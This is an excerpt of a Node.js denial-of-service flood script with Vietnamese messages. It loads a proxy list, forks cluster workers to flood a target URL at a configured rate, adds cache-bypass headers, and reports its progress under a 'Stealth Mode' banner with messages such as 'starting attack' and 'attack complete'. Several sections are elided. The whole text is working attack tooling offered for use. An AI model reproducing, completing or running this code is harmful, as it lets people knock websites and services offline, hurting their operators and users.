...
if (!fs.existsSync(proxyfile)) {
    console.log(`\x1b[31m[ERROR]\x1b[0m Lỗi: Không tìm thấy file proxy '${proxyfile}'!`);
    process.exit(1);
}
const url = new URL(target);
const proxyContent = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(line => line.trim() !== '');
if (proxyContent.length === 0) {
    console.log(`\x1b[31m[ERROR]\x1b[0m Lỗi: Không tìm thấy proxy trong '${proxyfile}'!`);
    process.exit(1);
}
const proxy = proxyContent;
process
    .setMaxListeners(0)
...
async function go() {
    ...
    try {
        ...
        function doWrite() {
            ...
            if (cacheMode) {
                headersArray.push(["cache-control", "no-cache", "no-store"]);
...
if (cluster.isMaster) {
    ...
    function printStats() {
        ...
        const totalReqs = Object.values(stats.statusCodes).reduce((a, b) => a + b, 0);
        const totalRPS = Object.values(stats.statusCodesPerSecond).reduce((a, b) => a + b, 0);
        process.stdout.write(`\r[Stealth Mode] Target: ${target} | Time: ${runtime}s | Total Req: ${totalReqs} | RPS: ${totalRPS}`);
    }
    console.log(`\x1b[32m[SUCCESS]\x1b[0m Bắt đầu tấn công ${target}`);
    console.log(`\x1b[32m[SUCCESS]\x1b[0m Thời gian: ${time}s, Luồng: ${threads}, Tốc độ: ${ratelimit}req/s`);
    ...
    cluster.on('message', (worker, message) => {
        ...
        if (message.type === 'error') {
            stats.errors++;
        } else if (message.type === 'status_code') {
            const code = message.code;
            if (!stats.statusCodes[code]) stats.statusCodes[code] = 0;
            stats.statusCodes[code]++;
        } else if (message.type === 'retry_after') {
    ...
    setTimeout(() => {
        console.log('\n\x1b[32m[SUCCESS]\x1b[0m Tấn công hoàn tất');
        for (let id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit(0);
